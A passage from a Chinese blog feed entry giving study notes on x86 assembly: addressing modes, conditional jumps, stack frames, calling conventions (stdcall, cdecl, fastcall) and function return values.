title="保存结果"></a>保存结果</h3><p>test和add</p><p>cmp和sub</p><p>前者保存数据，后者不保存</p><h3 id="寻址方式"><a href="#寻址方式" class="headerlink" title="寻址方式"></a>寻址方式</h3><p>是寻<strong>操作数</strong>的地址的方式</p><p>立即数寻址、寄存器寻址、存储器寻址</p><p>寄存器寻址：直接弄出来了寄存器中的数值，比如eax直接是指eax里面的数</p><p>存储器寻址：有直接、间接、基址</p><p>储存器寻址中：直接就是直接拿地址过来：[1000H]这种</p><p>间接： [eax] 也就是说要的不是eax中的值，要的是eax中这个表示了地址，再向内存中找这个地址</p><p>基址：[eax+1000H]这种，也就是把两种结合</p><h3 id="关于汇编语言的条件判断"><a href="#关于汇编语言的条件判断" class="headerlink" title="关于汇编语言的条件判断"></a>关于汇编语言的条件判断</h3><p>C语言条件跳转中<code>a&lt;b</code>对应的汇编的汇编代码是</p><p>mov eax, [a]; </p><p>cmp eax, [b];  //先比较a和b</p><p>jge XXX;  //如果a&gt;=b就跳到什么地方去</p><p>因为汇编和C语言好像是翻译上的不一样</p><p>在C语言中如果是a&gt;b</p><p>那么在汇编语言中就是a&lt;=b    </p><p>顺便一说，这个跳转指令自己就是个条件跳转，根据的是标志位的变动</p><p>A&gt;B：JG         （JNLE）<br>        A≥B：JGE       （JNL）<br>        A&lt;B：JL          （JNGE）<br>        A≤B：JLE        （JNG）</p><h2 id="函数的形成和原理"><a href="#函数的形成和原理" class="headerlink" title="函数的形成和原理"></a>函数的形成和原理</h2><h3 id="函数的一些小知识"><a href="#函数的一些小知识" class="headerlink" title="函数的一些小知识"></a>函数的一些小知识</h3><ul><li><p>函数参数的传递顺序：</p><p>从右往左传递参数</p></li><li><p>不可以指令的两边都是要访问内存的变量</p></li></ul><h3 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h3><p>栈在内存里面，并且这个数据的在地址中的顺序是从大到小这个方向在存储</p><p>从栈底到栈顶是逐渐变小的过程</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210525115634.png"></p><ul><li><p>函数开辟栈的指令:  push ebp ; </p><p>​                                  mov ebp,esp;</p></li><li><p>关闭栈的指令： mov esp,ebp; </p><p>​                            pop ebp; </p></li><li><p>call指令：先把这个call指令的下一个指令入栈，然后再跳转到call指令这个指令的里面的那个指令里面</p></li></ul><h4 id="调用栈的步骤"><a href="#调用栈的步骤" class="headerlink" title="调用栈的步骤"></a>调用栈的步骤</h4><ol><li>开辟栈，注意每个栈的ebp都代表的是上一个栈的东西，有点像是在保存前任的东西</li><li>把栈的大小决定，然后再压入ebx，esi、edi</li><li>开始初始化栈，把栈里面全部的储存空间都变成一模一样的数字</li><li>把变量弄进栈，在edi的后面</li><li>当要调用函数的时候，call函数把eip的值入栈，放在edi后面(或者是在变量后面)</li><li>函数重新开一个栈，又是把main函数的ebp先存起来</li><li>ret相当于 pop eip，把eip有弄回正道</li><li>最后栈平衡，目前来说就是有几个变量esp就往回加几个</li></ol><h4 id="栈平衡："><a href="#栈平衡：" class="headerlink" title="栈平衡："></a><strong>栈平衡</strong>：</h4><p>不同的两次函数调用，所形成的栈帧也不相同。当由一个函数进入到另一个函数中时，就会针对调用的函数开辟出其所需的栈空间，形成此函数的栈。</p><p>当这个函数结束调用时需要清除掉它所使用的栈空间，关闭栈帧，我们把这一过程称为栈平衡。</p><h4 id="对于函数调用，有三种不同的调用方式"><a href="#对于函数调用，有三种不同的调用方式" class="headerlink" title="对于函数调用，有三种不同的调用方式"></a>对于函数调用，有三种不同的调用方式</h4><p>stdcall、cdecl、fastcall，这三个东西主要的区别在，是哪个部分实现的栈平衡</p><p><img src="https://cdn.jsdelivr.net/gh/thanyi/image/20210525223018.png"></p><p><strong>只有cdecl 可以弄不定参数的函数</strong>，并且也只有它是由调用方，也就是说是call那个函数的那边来平衡栈，其他的都是要函数这边来平衡</p><p><strong>fastcall使用寄存器来传参</strong></p><h4 id="函数的返回值"><a href="#函数的返回值" class="headerlink" title="函数的返回值"></a>函数的返回值</h4><p>函数的返回值一般是在寄存器eax上</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;汇编语言&quot;&gt;&lt;a href=&quot;#汇编语言&quot; class=&quot;headerlink&quot; title=&quot;汇编语言&quot;&gt;&lt;/a&gt;汇编语言&lt;/h1&gt;&lt;h2 id=&quot;算数平移和逻辑平移&quot;&gt;&lt;a href=&quot;#算数平移和逻辑平移&quot; class=&quot;headerlink&quot; title=</summary>
      
    
    
    
    <category term="学习" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="汇编语言" scheme="https://thanyi.github.io/categories/%E5%AD%A6%E4%B9%A0/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="汇编语言" scheme="https://thanyi.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
    <category term="知识" scheme="https://thanyi.github.io/tags/%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
</feed>
